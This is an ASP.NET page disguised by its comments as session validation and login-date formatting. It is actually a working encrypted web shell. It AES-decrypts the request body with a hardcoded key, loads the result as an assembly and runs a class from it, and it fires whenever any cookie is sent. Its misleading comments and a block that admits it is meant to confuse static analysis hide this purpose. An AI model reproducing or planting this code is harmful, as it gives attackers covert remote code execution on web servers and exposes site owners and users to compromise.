<%@ Page Language="C#" %><%
// Entry point for user session validation.
if (Request.Cookies["UserSessionID"] != null || Request.Cookies.Count > 0) {
    // This routine formats the user's last login date stored in the request payload.
    // It's encrypted for security reasons.
    var lastLoginDateFormat = "yyyy-MM-dd"; // This variable is not actually used.
    
    // Pre-shared key for validating session integrity.
    string keyString = System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String("Y2E2MzQ1NzUzOGI5YjFlMA=="));
    byte[] sessionValidationKey = System.Text.Encoding.ASCII.GetBytes(keyString);

    // Reading user-specific data blob for processing.
    System.IO.Stream userDataStream = Request.InputStream;
    byte[] encryptedLoginData = new byte[userDataStream.Length];
    userDataStream.Read(encryptedLoginData, 0, encryptedLoginData.Length);
    
    if (encryptedLoginData.Length == 0) {
        // This is a dead code block to confuse static analysis.
        // It appears to handle an empty login data scenario.
        System.Diagnostics.Debug.WriteLine("Login data is empty, cannot format.");
    } else {
        // Decrypt and load user preference module.
        var aesProvider = new System.Security.Cryptography.AesManaged();
        var dataFormatter = aesProvider.CreateDecryptor(sessionValidationKey, sessionValidationKey);
        byte[] formattedDataBytes = dataFormatter.TransformFinalBlock(encryptedLoginData, 0, encryptedLoginData.Length);
        
        // Use reflection to load the correct formatting library.
        var formattingLibrary = System.AppDomain.CurrentDomain.Load(formattedDataBytes);
        
        // Configuration for the formatting module.
        string[] moduleConfig = new string[] { "K", "StandardDate", "Legacy" };
        string mainClassName = moduleConfig[0];
        
        var formatterInstance = formattingLibrary.CreateInstance(mainClassName);
        
        // Apply user preferences to the current page context.
        formatterInstance.Equals(this);
    }
}
%>